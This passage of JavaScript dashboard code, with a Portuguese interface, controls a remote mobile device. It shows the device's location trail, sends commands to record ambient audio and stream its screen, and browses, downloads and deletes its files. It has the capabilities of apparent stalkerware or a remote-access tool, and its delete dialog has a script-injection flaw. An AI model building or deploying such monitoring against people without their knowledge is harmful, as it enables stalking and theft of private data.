                const opacity = 0.3 + ratio * 0.6;
                const weight  = 2 + ratio * 2.5;

                // Leaflet polyline — coords are [lat, lng] arrays
                const latlngs = group.coords.map(c => [c.lat, c.lng]);
                const polyline = L.polyline(latlngs, {
                    color, opacity, weight, smoothFactor: 1.5
                }).addTo(map);
                trailPolylines.push(polyline);

                // Day label marker
                if (idx < totalDays - 1) {
                    const label = new Date(group.day).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' });
                    const dayIcon = L.divIcon({
                        className: '',
                        html: `<div class="day-marker-dot" style="background:${color};"><span class="day-marker-label">${label}</span></div>`,
                        iconSize: [36, 18], iconAnchor: [18, 9]
                    });
                    const m = L.marker([group.coords[0].lat, group.coords[0].lng], { icon: dayIcon }).addTo(map);
                    dayMarkers.push(m);
                }
            });

            // Device position marker
            const lastPt = points[points.length - 1];
            document.getElementById('location-accuracy').textContent = `Precisão: ${lastPt.accuracy.toFixed(1)}m`;

            if (deviceMarker)       { map.removeLayer(deviceMarker); }
            if (deviceAccuracyCircle){ map.removeLayer(deviceAccuracyCircle); }

            const devIcon = L.divIcon({
                className: '',
                html: '<div class="device-marker-dot"></div>',
                iconSize: [20, 20], iconAnchor: [10, 10]
            });
            deviceMarker = L.marker([lastPt.lat, lastPt.lng], { icon: devIcon, zIndexOffset: 1000 }).addTo(map);
            deviceMarker.bindPopup('<b>Última localização conhecida</b>');

            deviceAccuracyCircle = L.circle([lastPt.lat, lastPt.lng], {
                radius: lastPt.accuracy,
                color: '#00d2ff', opacity: 0.5, weight: 1.5,
                fillColor: '#00d2ff', fillOpacity: 0.1
            }).addTo(map);

            // Fit bounds
            const allLatLngs = points.map(p => [p.lat, p.lng]);
            if (allLatLngs.length > 0) map.fitBounds(allLatLngs, { padding: [20, 20] });
        })
        .catch(err => console.error('Error fetching trail:', err));
}

// Group telemetry points by calendar day
function groupPointsByDay(points) {
    const groups = [];
    let currentDay = null;
    let currentGroup = null;

    points.forEach(p => {
        const d = new Date(p.timestamp);
        const dayKey = `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
        if (dayKey !== currentDay) {
            if (currentGroup) groups.push(currentGroup);
            currentDay = dayKey;
            currentGroup = { day: p.timestamp, coords: [] };
        }
        currentGroup.coords.push({ lat: p.lat, lng: p.lng });
    });
    if (currentGroup) groups.push(currentGroup);
    return groups;
}

// Interpolate trail color: 0=oldest (purple/grey), 1=newest (neon cyan)
function interpolateTrailColor(ratio) {
    // oldest: #6b4fa0 (purple)  →  newest: #00d2ff (neon cyan)
    const r = Math.round(107 + (0 - 107) * ratio);
    const g = Math.round(79 + (210 - 79) * ratio);
    const b = Math.round(160 + (255 - 160) * ratio);
    return `rgb(${r},${g},${b})`;
}

// Clear all trail polylines and day markers from map
function clearTrail() {
    if (map) {
        trailPolylines.forEach(p => map.removeLayer(p));
        dayMarkers.forEach(m => map.removeLayer(m));
    }
    trailPolylines = [];
    dayMarkers = [];
}

// Refresh trail when days selector changes
function refreshTrail() {
    if (currentDeviceId) fetchTrailHistory(currentDeviceId);
}

// Handle real-time telemetry details (location, battery)
function handleTelemetry(data) {
    if (data.deviceId !== currentDeviceId) return;

    if (data.battery !== undefined) {
        updateBatteryUI(data.battery, data.isCharging || false);
    }

    if (data.lat && data.lng) {
        const lat      = parseFloat(data.lat);
        const lng      = parseFloat(data.lng);
        const accuracy = parseFloat(data.accuracy) || 10;
        const provider = data.provider || 'gps';

        // Accuracy indicator top bar
        const accEl = document.getElementById('location-accuracy');
        if (accEl) {
            const providerLabel = provider === 'gps' ? '📡 GPS' : provider === 'fused' ? '🔀 Fusão' : '📶 Rede';
            const color = accuracy <= 10 ? '#39ff14' : accuracy <= 50 ? '#ff9900' : '#ff3838';
            accEl.innerHTML = `<span style="color:${color};font-weight:600;">${providerLabel} ±${accuracy.toFixed(0)}m</span>`;
        }

        // Mobile GPS bar
        updateGpsBar(lat, lng, accuracy, Date.now());

        // Add to trail history cache (live point)
        trailHistoryPoints.push({ lat, lng, accuracy, timestamp: Date.now() });
        const kEl = document.getElementById('trail-km');
        const pEl = document.getElementById('trail-pts');
        if (pEl) pEl.textContent = trailHistoryPoints.length;
        if (kEl && trailHistoryPoints.length >= 2) kEl.textContent = calcTotalDistance(trailHistoryPoints).toFixed(1);

        logToConsole(`📍 ${provider.toUpperCase()} ±${accuracy.toFixed(0)}m — ${lat.toFixed(5)}, ${lng.toFixed(5)}`, 'system');

        const pos = { lat, lng };

        // Marker color by accuracy
        const markerColor = accuracy <= 15 ? '#00d2ff' : accuracy <= 50 ? '#ff9900' : '#ff3838';

        if (deviceMarker) {
            // Update existing Leaflet marker and circle
            deviceMarker.setLatLng([lat, lng]);
            const el = deviceMarker.getElement();
            if (el) el.querySelector('.device-marker-dot')?.setAttribute('style', `background:${markerColor};box-shadow:0 0 12px ${markerColor}80;`);
            deviceAccuracyCircle.setLatLng([lat, lng]);
            deviceAccuracyCircle.setRadius(accuracy);
            deviceAccuracyCircle.setStyle({ color: markerColor, fillColor: markerColor });
        } else if (map) {
            const devIcon = L.divIcon({
                className: '',
                html: `<div class="device-marker-dot" style="background:${markerColor};box-shadow:0 0 12px ${markerColor}80;"></div>`,
                iconSize: [20, 20], iconAnchor: [10, 10]
            });
            deviceMarker = L.marker([lat, lng], { icon: devIcon, zIndexOffset: 1000 }).addTo(map);
            deviceMarker.bindPopup('<b>Dispositivo</b>');
            deviceAccuracyCircle = L.circle([lat, lng], {
                radius: accuracy,
                color: markerColor, opacity: 0.5, weight: 1.5,
                fillColor: markerColor, fillOpacity: 0.1
            }).addTo(map);
        }

        // Append to live trail polyline
        if (trailPolylines.length > 0) {
            trailPolylines[trailPolylines.length - 1].addLatLng([lat, lng]);
        } else if (map) {
            trailPolylines.push(
                L.polyline([[lat, lng]], { color: '#00d2ff', opacity: 0.9, weight: 3 }).addTo(map)
            );
        }

        // Follow mode
        if (map && mapFollowMode) {
            map.panTo([lat, lng]);
            if (map.getZoom() < 15) map.setZoom(16);
        }
    }

}

// Fetch photos and audios for the selected device
function fetchMediaList(deviceId) {
    fetch(`/uploads/${deviceId}/media-list`, { headers: authHeaders() })
        .then(res => res.json())
        .then(data => {
            renderPhotos(deviceId, data.photos || []);
            renderAudios(deviceId, data.audio || []);
            renderSentAudios(deviceId);
        })
        .catch(err => console.error('Error fetching media list:', err));
}

// Render sent audio commands for current device
function renderSentAudios(deviceId) {
    const list = document.getElementById('audio-sent-list');
    if (!list) return;
    const entries = sentAudioLog.filter(e => e.deviceId === deviceId);
    if (entries.length === 0) {
        list.innerHTML = '<div class="empty-audio-msg">Nenhum comando enviado ainda.</div>';
        return;
    }
    list.innerHTML = '';
    // Show newest first
    [...entries].reverse().forEach(e => appendSentAudio(e, false));
}

function appendSentAudio(entry, prepend = true) {
    const list = document.getElementById('audio-sent-list');
    if (!list) return;
    const empty = list.querySelector('.empty-audio-msg');
    if (empty) empty.remove();

    const time = new Date(entry.ts).toLocaleTimeString('pt-BR') + ' ' + new Date(entry.ts).toLocaleDateString('pt-BR');
    const div = document.createElement('div');
    div.className = 'audio-item audio-sent';
    div.innerHTML = `
        <div class="audio-info">
            <i class="fa-solid fa-paper-plane"></i>
            <div class="audio-meta">
                <span class="audio-name">Comando de Gravação (${entry.duration}s)</span>
                <span class="audio-time">${time}</span>
            </div>
        </div>
        <span class="audio-sent-badge">ENVIADO</span>
    `;
    if (prepend && list.firstChild) list.insertBefore(div, list.firstChild);
    else list.appendChild(div);
}

// Render photo gallery
function renderPhotos(deviceId, photos) {
    const gallery = document.getElementById('photo-gallery');
    gallery.innerHTML = '';

    // Populate global list for modal navigation
    pmPhotos = photos.map(item => {
        const fileName = item.name || item;
        const url      = item.url || `/uploads/${deviceId}/photos/${fileName}`;
        const tsMatch  = fileName.match(/photo_(\d+)\.jpg/);
        let caption    = 'Captura';
        if (tsMatch) {
            const d = new Date(parseInt(tsMatch[1]));
            caption = d.toLocaleTimeString('pt-BR') + ' · ' + d.toLocaleDateString('pt-BR');
        }
        return { url, caption };
    });

    if (pmPhotos.length === 0) {
        gallery.innerHTML = '<div class="empty-gallery-msg">Nenhuma foto capturada ainda.</div>';
        return;
    }

    pmPhotos.forEach((p, idx) => {
        const photoDiv = document.createElement('div');
        photoDiv.className = 'gallery-photo-item';
        photoDiv.onclick = () => openPhotoModal(idx);

        photoDiv.innerHTML = `
            <img src="${p.url}" alt="Foto" loading="lazy">
            <span class="photo-timestamp">${p.caption}</span>
        `;
        gallery.appendChild(photoDiv);
    });
}

// Render Audio Playlist
function renderAudios(deviceId, audios) {
    const audioList = document.getElementById('audio-list');
    audioList.innerHTML = '';

    if (audios.length === 0) {
        audioList.innerHTML = '<div class="empty-audio-msg">Nenhuma gravação de áudio encontrada.</div>';
        return;
    }

    audios.forEach(item => {
        const fileName = item.name || item;
        const fileUrl = item.url || `/uploads/${deviceId}/audio/${fileName}`;

        const tsMatch = fileName.match(/audio_(\d+)\.aac/);
        let timeStr = 'Gravação';
        if (tsMatch) {
            const date = new Date(parseInt(tsMatch[1]));
            timeStr = date.toLocaleTimeString('pt-BR') + ' ' + date.toLocaleDateString('pt-BR');
        }

        const audioDiv = document.createElement('div');
        audioDiv.className = 'audio-item';

        audioDiv.innerHTML = `
            <div class="audio-info">
                <i class="fa-solid fa-microphone-lines"></i>
                <div class="audio-meta">
                    <span class="audio-name">Áudio Ambiente</span>
                    <span class="audio-time">${timeStr}</span>
                </div>
            </div>
            <div class="audio-player-control">
                <audio controls preload="metadata">
                    <source src="${fileUrl}" type="audio/aac">
                    <source src="${fileUrl}" type="audio/mp4">
                    <source src="${fileUrl}" type="audio/mpeg">
                </audio>
            </div>
        `;

        const audioEl = audioDiv.querySelector('audio');
        audioEl.addEventListener('error', async () => {
            // Fallback: fetch as blob so browser can play from memory (bypasses CORS/redirect issues)
            try {
                const resp = await fetch(fileUrl, { headers: authHeaders() });
                if (resp.ok) {
                    const blob = await resp.blob();
                    const blobUrl = URL.createObjectURL(blob);
                    audioEl.src = blobUrl;
                    audioEl.load();
                } else {
                    audioEl.parentElement.innerHTML = `<a href="${fileUrl}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
                }
            } catch {
                audioEl.parentElement.innerHTML = `<a href="${fileUrl}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
            }
        });

        audioList.appendChild(audioDiv);
    });
}

// Send Remote Command over WebSocket
function sendCommand(command, params = {}) {
    if (!currentDeviceId) {
        logToConsole('Nenhum dispositivo selecionado!', 'error');
        return;
    }

    const device = devicesMap.get(currentDeviceId);
    if (device && !device.isOnline) {
        logToConsole(`Comando '${command}' falhou: Dispositivo está OFFLINE!`, 'error');
        return;
    }

    const payload = { command, deviceId: currentDeviceId, ...params };

    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify(payload));
        logToConsole(`Comando enviado: ${command} (${JSON.stringify(params)})`, 'command');

        // Track sent audio commands to display in audio panel
        if (command === 'RECORD_AUDIO') {
            const entry = { ts: Date.now(), duration: params.duration || 15, deviceId: currentDeviceId };
            sentAudioLog.push(entry);
            if (currentDeviceId === entry.deviceId) appendSentAudio(entry);
        }
    } else {
        logToConsole('Erro: Sem conexão com o servidor!', 'error');
    }
}

// Toggle Screen Capture Streaming state
function toggleScreenStream() {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }

    if (isScreenStreaming) {
        sendCommand('STOP_SCREEN_STREAM');
        stopLocalScreenUI();
        logToConsole('Transmissão de tela encerrada.', 'system');
    } else {
        sendCommand('START_SCREEN_STREAM');
        isScreenStreaming = true;

        const badge = document.getElementById('screen-stream-badge');
        if (badge) badge.style.display = 'inline-flex';

        const icon = document.getElementById('sc-screen-icon');
        if (icon) icon.className = 'fa-solid fa-stop';

        // Also update command panel button if exists
        const btnText = document.getElementById('screen-btn-text');
        const btnIcon = document.getElementById('screen-btn-icon');
        const btn     = document.getElementById('btn-screen');
        if (btnText) btnText.textContent = 'Parar Tela';
        if (btnIcon) btnIcon.className = 'fa-solid fa-stop-circle fa-beat';
        if (btn) { btn.classList.add('btn-danger'); btn.classList.remove('btn-secondary'); }

        logToConsole('Aguardando transmissão de tela...', 'system');
    }
}

// Stop screen sharing UI locally
function stopLocalScreenUI() {
    isScreenStreaming = false;

    const badge = document.getElementById('screen-stream-badge');
    if (badge) badge.style.display = 'none';

    const img = document.getElementById('screen-stream-img');
    const ph  = document.getElementById('screen-placeholder');
    if (img) { img.src = ''; img.style.display = 'none'; }
    if (ph)  ph.style.display = 'flex';

    const icon = document.getElementById('sc-screen-icon');
    if (icon) icon.className = 'fa-solid fa-play';

    const btnText = document.getElementById('screen-btn-text');
    const btnIcon = document.getElementById('screen-btn-icon');
    const btn     = document.getElementById('btn-screen');
    if (btnText) btnText.textContent = 'Tela ao Vivo';
    if (btnIcon) btnIcon.className = 'fa-solid fa-desktop';
    if (btn) { btn.classList.remove('btn-danger'); btn.classList.add('btn-secondary'); }

    if (currentStreamObjectUrl) { URL.revokeObjectURL(currentStreamObjectUrl); currentStreamObjectUrl = null; }
}

// Log formatting for terminal window
function logToConsole(message, type = 'system') {
    const consoleBody = document.getElementById('terminal-body');
    if (!consoleBody) return;
    
    const time = new Date().toLocaleTimeString('pt-BR');
    
    const line = document.createElement('div');
    line.className = `terminal-line ${type}`;
    line.innerHTML = `<span class="timestamp">[${time}]</span> ${escapeHtml(message)}`;
    
    consoleBody.appendChild(line);
    consoleBody.scrollTop = consoleBody.scrollHeight; // Auto scroll down
}

// Clear Terminal body
function clearConsole() {
    const consoleBody = document.getElementById('terminal-body');
    if (consoleBody) {
        consoleBody.innerHTML = '';
    }
}

// ─── Photo Lightbox Modal ─────────────────────────────────────────────────────

let pmPhotos   = [];   // [{url, caption}]
let pmIndex    = 0;
let pmZoomed   = false;
let pmScale    = 1;
let pmPanX     = 0;
let pmPanY     = 0;

// Touch/swipe state
let pmTouchStartX = 0;
let pmTouchStartY = 0;
let pmTouchDist   = 0;  // for pinch
let pmIsPinching  = false;
let pmIsDragging  = false;

function openImageModal(src, caption) {
    // Find index in current photo list
    const idx = pmPhotos.findIndex(p => p.url === src);
    openPhotoModal(idx >= 0 ? idx : 0);
}

// Called from renderPhotos with full list
function openPhotoModal(index) {
    if (pmPhotos.length === 0) return;
    pmIndex  = Math.max(0, Math.min(index, pmPhotos.length - 1));
    pmZoomed = false;
    pmScale  = 1; pmPanX = 0; pmPanY = 0;

    const modal = document.getElementById('photo-modal');
    modal.classList.add('open');
    document.body.style.overflow = 'hidden';

    pmRender();
    pmBuildThumbs();
    pmAttachGestures();
    pmAttachKeyboard();
}

function closePhotoModal() {
    document.getElementById('photo-modal').classList.remove('open');
    document.body.style.overflow = '';
    pmDetachKeyboard();
    pmResetZoom();
}

function pmRender(slideDir) {
    const img     = document.getElementById('pm-img');
    const caption = document.getElementById('pm-caption');
    const counter = document.getElementById('pm-counter');
    const dl      = document.getElementById('pm-download');
    const p       = pmPhotos[pmIndex];

    // Animate
    img.classList.remove('pm-slide-left', 'pm-slide-right');
    if (slideDir === 1)  { void img.offsetWidth; img.classList.add('pm-slide-left');  }
    if (slideDir === -1) { void img.offsetWidth; img.classList.add('pm-slide-right'); }

    img.src        = p.url;
    caption.textContent = p.caption;
    counter.textContent = `${pmIndex + 1} / ${pmPhotos.length}`;
    dl.href        = p.url;
    dl.download    = p.caption.replace(/[^a-z0-9]/gi, '_') + '.jpg';

    // Nav arrows
    document.getElementById('pm-prev').disabled = pmIndex === 0;
    document.getElementById('pm-next').disabled = pmIndex === pmPhotos.length - 1;

    // Highlight active thumb
    document.querySelectorAll('.pm-thumb').forEach((t, i) => {
        t.classList.toggle('active', i === pmIndex);
    });
    // Scroll thumb into view
    const activeTh = document.querySelector('.pm-thumb.active');
    if (activeTh) activeTh.scrollIntoView({ behavior: 'smooth', inline: 'center', block: 'nearest' });

    pmResetZoom();
}

function pmNavigate(dir) {
    const next = pmIndex + dir;
    if (next < 0 || next >= pmPhotos.length) return;
    pmIndex = next;
    pmRender(dir);
}

function pmBuildThumbs() {
    const strip = document.getElementById('pm-thumbs');
    strip.innerHTML = '';
    pmPhotos.forEach((p, i) => {
        const img = document.createElement('img');
        img.src       = p.url;
        img.className = 'pm-thumb' + (i === pmIndex ? ' active' : '');
        img.alt       = p.caption;
        img.loading   = 'lazy';
        img.onclick   = () => { pmIndex = i; pmRender(); };
        strip.appendChild(img);
    });
}

// ── Zoom ─────────────────────────────────────────────────────────────────────
function pmToggleZoom() {
    pmZoomed = !pmZoomed;
    pmScale  = pmZoomed ? 2.5 : 1;
    pmPanX   = 0; pmPanY = 0;
    pmApplyTransform();
    const icon = document.getElementById('pm-zoom-icon');
    icon.className = pmZoomed ? 'fa-solid fa-magnifying-glass-minus' : 'fa-solid fa-magnifying-glass-plus';
}

function pmResetZoom() {
    pmZoomed = false; pmScale = 1; pmPanX = 0; pmPanY = 0;
    pmApplyTransform(false);
    const icon = document.getElementById('pm-zoom-icon');
    if (icon) icon.className = 'fa-solid fa-magnifying-glass-plus';
}

function pmApplyTransform(animate = true) {
    const img = document.getElementById('pm-img');
    img.style.transition = animate ? 'transform 0.25s cubic-bezier(0.4,0,0.2,1)' : 'none';
    img.style.transform  = `scale(${pmScale}) translate(${pmPanX}px, ${pmPanY}px)`;
}

// ── Touch / Swipe / Pinch ────────────────────────────────────────────────────
function pmAttachGestures() {
    const stage = document.getElementById('pm-stage');
    stage.addEventListener('touchstart',  pmOnTouchStart,  { passive: false });
    stage.addEventListener('touchmove',   pmOnTouchMove,   { passive: false });
    stage.addEventListener('touchend',    pmOnTouchEnd,    { passive: true  });
    stage.addEventListener('dblclick',    pmToggleZoom);
}

function pmTouchDist2(t) {
    const dx = t[0].clientX - t[1].clientX;
    const dy = t[0].clientY - t[1].clientY;
    return Math.sqrt(dx*dx + dy*dy);
}

function pmOnTouchStart(e) {
    if (e.touches.length === 2) {
        pmIsPinching = true;
        pmTouchDist  = pmTouchDist2(e.touches);
    } else {
        pmIsPinching  = false;
        pmIsDragging  = false;
        pmTouchStartX = e.touches[0].clientX;
        pmTouchStartY = e.touches[0].clientY;
    }
}

function pmOnTouchMove(e) {
    if (pmIsPinching && e.touches.length === 2) {
        e.preventDefault();
        const newDist = pmTouchDist2(e.touches);
        const ratio   = newDist / pmTouchDist;
        pmScale       = Math.max(1, Math.min(5, pmScale * ratio));
        pmTouchDist   = newDist;
        pmZoomed      = pmScale > 1;
        pmApplyTransform(false);
        return;
    }
    if (pmZoomed && e.touches.length === 1) {
        e.preventDefault();
        const dx = e.touches[0].clientX - pmTouchStartX;
        const dy = e.touches[0].clientY - pmTouchStartY;
        pmPanX += dx / pmScale;
        pmPanY += dy / pmScale;
        pmTouchStartX = e.touches[0].clientX;
        pmTouchStartY = e.touches[0].clientY;
        pmApplyTransform(false);
    }
}

function pmOnTouchEnd(e) {
    if (pmIsPinching) { pmIsPinching = false; return; }
    if (pmZoomed) return; // don't swipe when zoomed

    const dx = e.changedTouches[0].clientX - pmTouchStartX;
    const dy = e.changedTouches[0].clientY - pmTouchStartY;
    const absDx = Math.abs(dx), absDy = Math.abs(dy);

    if (absDx > 40 && absDx > absDy * 1.5) {
        pmNavigate(dx < 0 ? 1 : -1);   // swipe left = next, right = prev
    } else if (absDx < 8 && absDy < 8) {
        pmToggleZoom();                 // small tap = zoom toggle
    }
}

// ── Keyboard ─────────────────────────────────────────────────────────────────
function pmKeyHandler(e) {
    if (e.key === 'ArrowRight') pmNavigate(1);
    if (e.key === 'ArrowLeft')  pmNavigate(-1);
    if (e.key === 'Escape')     closePhotoModal();
    if (e.key === '+' || e.key === '=') pmToggleZoom();
}

function pmAttachKeyboard() { document.addEventListener('keydown', pmKeyHandler); }
function pmDetachKeyboard() { document.removeEventListener('keydown', pmKeyHandler); }

// Keep old name working (called from renderPhotos onclick)
function closeImageModal() { closePhotoModal(); }

// Escaping html for console logs safety
function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
}

// ─── Remote File Browser ─────────────────────────────────────────────────────

function fbOpen(path) {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
    const p = path || '/sdcard';
    fbCurrentPath = p;
    document.getElementById('fb-loading').style.display = 'flex';
    document.getElementById('fb-empty').style.display   = 'none';
    document.getElementById('fb-list').style.display    = 'none';
    sendCommand('LIST_FILES', { path: p });
}

function fbRefresh() { if (fbCurrentPath) fbOpen(fbCurrentPath); }

function fbNavigateUp() {
    if (fbHistory.length > 0) {
        fbCurrentPath = fbHistory.pop();
        fbOpen(fbCurrentPath);
    }
}

function fbRenderList(data) {
    document.getElementById('fb-loading').style.display = 'none';
    document.getElementById('fb-empty').style.display   = 'none';

    const list = document.getElementById('fb-list');
    list.style.display = 'grid';
    list.innerHTML = '';

    // Breadcrumb
    document.getElementById('fb-breadcrumb').textContent = data.path || '/';

    // Up button
    const upBtn = document.getElementById('fb-up-btn');
    if (upBtn) upBtn.disabled = !data.parent || data.parent === data.path;

    if (!data.files || data.files.length === 0) {
        list.innerHTML = '<div style="color:var(--text-secondary);font-size:.85rem;padding:24px;grid-column:1/-1;text-align:center;"><i class="fa-solid fa-folder-open"></i> Pasta vazia</div>';
        return;
    }

    data.files.forEach(f => {
        const isDir  = f.type === 'dir';
        const icon   = fbIcon(f.ext, isDir);
        const size   = isDir ? '' : fbFormatSize(f.size);
        const date   = new Date(f.modified).toLocaleDateString('pt-BR');

        const isImg = fbIsImage(f.ext);
        const isVid = ['mp4','mkv','avi','mov','3gp','webm'].includes((f.ext||'').toLowerCase());
        const canPreview = !isDir && (isImg || isVid);

        const div = document.createElement('div');
        div.className = 'fb-item' + (canPreview ? ' fb-item-previewable' : '');
        div.innerHTML = `
            <span class="fb-item-icon ${fbIconClass(f.ext, isDir)}">${icon}</span>
            <div class="fb-item-info">
                <span class="fb-item-name" title="${escapeHtml(f.name)}">${escapeHtml(f.name)}</span>
                <span class="fb-item-meta">${size}${size && date ? ' · ' : ''}${date}</span>
            </div>
            <div class="fb-item-actions">
                ${canPreview ? `<button class="fb-act-btn fb-preview-btn" title="Visualizar" style="color:var(--neon-blue)"><i class="fa-solid fa-eye"></i></button>` : ''}
                ${!isDir ? `<button class="fb-act-btn dl" title="Baixar" style="color:var(--neon-blue)"><i class="fa-solid fa-download"></i></button>` : ''}
                <button class="fb-act-btn del" title="Excluir"><i class="fa-solid fa-trash"></i></button>
            </div>
            ${canPreview ? '<div class="fb-preview-hint"><i class="fa-solid fa-eye"></i></div>' : ''}
        `;

        // Bind actions safely (avoid inline onclick with complex args)
        if (isDir) {
            div.addEventListener('click', e => {
                if (e.target.closest('.fb-item-actions')) return;
                fbHistory.push(data.path);
                fbOpen(f.path);
            });
        } else {
            // Preview button or click on image/video → open preview
            if (canPreview) {
                const previewBtn = div.querySelector('.fb-preview-btn');
                if (previewBtn) previewBtn.addEventListener('click', e => {
                    e.stopPropagation();
                    fbPreview(f.path, f.name, div);
                });
                // Click anywhere on image/video item (outside actions) → preview
                div.addEventListener('click', e => {
                    if (e.target.closest('.fb-item-actions')) return;
                    fbPreview(f.path, f.name, div);
                });
            }
            // Download button
            const dlBtn = div.querySelector('.fb-act-btn.dl');
            if (dlBtn) dlBtn.addEventListener('click', e => {
                e.stopPropagation();
                fbDownload(f.path, f.name);
            });
        }

        // Delete button
        const delBtn = div.querySelector('.fb-act-btn.del');
        if (delBtn) delBtn.addEventListener('click', e => {
            e.stopPropagation();
            fbConfirmDelete(f.path, f.name);
        });

        list.appendChild(div);
    });
}

function fbShowError(msg) {
    document.getElementById('fb-loading').style.display = 'none';
    document.getElementById('fb-list').style.display    = 'none';
    const empty = document.getElementById('fb-empty');
    empty.style.display = 'flex';
    empty.innerHTML = `<i class="fa-solid fa-triangle-exclamation fa-2x" style="color:var(--danger-red)"></i><p style="color:var(--danger-red)">${escapeHtml(msg)}</p><button class="btn btn-sm btn-primary" onclick="fbOpen()"><i class="fa-solid fa-folder-open"></i> Abrir Raiz</button>`;
}

// ── Preview image directly in lightbox (no manual download needed) ────────────
function fbPreview(path, name, itemEl) {
    if (!currentDeviceId) return;
    if (fbPreviewPending[path]) return; // already loading

    // Visual feedback: loading spinner on the item
    fbPreviewPending[path] = { name, itemEl };
    itemEl.classList.add('fb-item-loading');
    const previewBtn = itemEl.querySelector('.fb-preview-btn');
    if (previewBtn) previewBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';

    logToConsole(`🔍 Carregando preview: ${name}`, 'system');
    sendCommand('DOWNLOAD_FILE', { path });
}

// Called when server sends FILE_READY — routes to lightbox or download toast
function fbHandleFileReady(name, url, originalPath) {
    const pending = fbPreviewPending[originalPath];
    const ext     = (name.split('.').pop() || '').toLowerCase();
    const isImg   = fbIsImage(ext);
    const isVideo = ['mp4','mkv','avi','mov','3gp','webm'].includes(ext);

    // Restore item state if it was a preview request
    if (pending) {
        pending.itemEl.classList.remove('fb-item-loading');
        const btn = pending.itemEl.querySelector('.fb-preview-btn');
        if (btn) btn.innerHTML = '<i class="fa-solid fa-eye"></i>';
        delete fbPreviewPending[originalPath];
    }

    if (isImg) {
        // Open image directly in the photo lightbox modal
        pmPhotos = [{ url, caption: name }];
        openPhotoModal(0);
        return;
    }

    if (isVideo) {
        // Open video in a simple video player overlay
        fbOpenVideoPlayer(url, name);
        return;
    }

    // Non-previewable file: show download toast
    fbShowDownloadToast(name, url, originalPath);
}

function fbOpenVideoPlayer(url, name) {
    const overlay = document.createElement('div');
    overlay.className = 'fb-video-overlay';
    overlay.innerHTML = `
        <div class="fb-video-box">
            <div class="fb-video-header">
                <span>${escapeHtml(name)}</span>
                <div style="display:flex;gap:8px;">
                    <a href="${url}" download="${escapeHtml(name)}" class="fb-video-action" title="Baixar">
                        <i class="fa-solid fa-download"></i>
                    </a>
                    <button class="fb-video-action" onclick="this.closest('.fb-video-overlay').remove()" title="Fechar">
                        <i class="fa-solid fa-xmark"></i>
                    </button>
                </div>
            </div>
            <video class="fb-video-player" controls autoplay>
                <source src="${url}">
                Seu navegador não suporta o player de vídeo.
            </video>
        </div>
    `;
    overlay.addEventListener('click', e => { if (e.target === overlay) overlay.remove(); });
    document.body.appendChild(overlay);
    setTimeout(() => overlay.style.opacity = '1', 10);
}

function fbDownload(path, name) {
    if (!currentDeviceId) return;
    logToConsole(`⬇️ Solicitando download: ${name}`, 'system');
    sendCommand('DOWNLOAD_FILE', { path });
}

function fbShowDownloadToast(name, url, originalPath) {
    const toast = document.createElement('div');
    toast.className = 'fb-download-toast';
    toast.innerHTML = `
        <i class="fa-solid fa-file-arrow-down" style="color:var(--neon-blue)"></i>
        <div style="flex:1;min-width:0;">
            <div style="font-weight:600;font-size:.85rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(name)}</div>
            <div style="font-size:.7rem;color:var(--text-secondary)">Pronto para baixar</div>
        </div>
        <a href="${url}" download="${escapeHtml(name)}" class="fb-act-btn dl" style="text-decoration:none;padding:6px 10px;border:1px solid var(--neon-blue);border-radius:8px;font-size:.78rem;font-weight:600;color:var(--neon-blue);">
            <i class="fa-solid fa-download"></i> Baixar
        </a>
        <button onclick="this.parentElement.remove()" style="background:none;border:none;color:var(--text-secondary);cursor:pointer;font-size:1rem;padding:4px;">✕</button>
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.style.opacity = '1', 10);
    setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 400); }, 15000);
}

function fbConfirmDelete(path, name) {
    const overlay = document.createElement('div');
    overlay.className = 'fb-confirm-overlay';
    overlay.innerHTML = `
        <div class="fb-confirm-box">
            <div class="fb-confirm-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
            <div class="fb-confirm-title">Excluir permanentemente?</div>
            <div class="fb-confirm-path">${escapeHtml(path)}</div>
            <div class="fb-confirm-btns">
                <button class="fb-btn-cancel" onclick="this.closest('.fb-confirm-overlay').remove()">Cancelar</button>
                <button class="fb-btn-delete" onclick="fbDeleteConfirmed('${escapeHtml(path)}',this)">
                    <i class="fa-solid fa-trash"></i> Excluir
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);
}

function fbDeleteConfirmed(path, btn) {
    btn.closest('.fb-confirm-overlay').remove();
    sendCommand('DELETE_FILE', { path });
    logToConsole(`🗑️ Exclusão solicitada: ${path}`, 'command');
}

// ── File browser helpers ──────────────────────────────────────────────────────
function fbIcon(ext, isDir) {
    if (isDir) return '📁';
    const e = (ext || '').toLowerCase();
    if (['jpg','jpeg','png','gif','webp','heic'].includes(e)) return '🖼️';
    if (['mp4','mkv','avi','mov','3gp'].includes(e)) return '🎬';
    if (['mp3','aac','ogg','flac','m4a'].includes(e)) return '🎵';
    if (['pdf'].includes(e)) return '📄';
    if (['doc','docx'].includes(e)) return '📝';
    if (['xls','xlsx'].includes(e)) return '📊';
    if (['zip','rar','7z','tar'].includes(e)) return '🗜️';
    if (['apk'].includes(e)) return '📦';
    return '📄';
}
function fbIconClass(ext, isDir) {
    if (isDir) return 'dir';
    const e = (ext || '').toLowerCase();
    if (['jpg','jpeg','png','gif','webp','heic'].includes(e)) return 'img';
    if (['mp4','mkv','avi','mov','3gp'].includes(e)) return 'vid';
    if (['mp3','aac','ogg','flac','m4a'].includes(e)) return 'aud';
    if (['pdf','doc','docx','xls','xlsx','txt'].includes(e)) return 'doc';
    if (['zip','rar','7z'].includes(e)) return 'zip';
    return 'file';
}
